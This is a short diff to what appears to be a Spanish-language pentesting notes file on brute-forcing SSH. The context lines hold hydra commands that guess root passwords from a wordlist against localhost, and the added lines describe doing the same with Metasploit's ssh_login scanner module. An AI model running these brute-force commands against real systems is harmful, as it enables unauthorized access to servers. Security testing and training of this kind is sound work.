@@ -33,3 +33,11 @@ hydra ssh://127.0.0.1 ssh -s 22 -l root -P pass.txt -f -vV
 hydra -t 64 ssh://127.0.0.1 ssh -s 22 -l root -P pass.txt
 
 ```
+
+### Fuerza bruta servicio SSH con Metasploit
+```bash
+# search ssh_login, utilizaremos auxiliary/scanner/ssh/ssh_login
+Completamos los datos y "run"
+# METASPLOIT es un poco mas lento que hydra.
+```
+
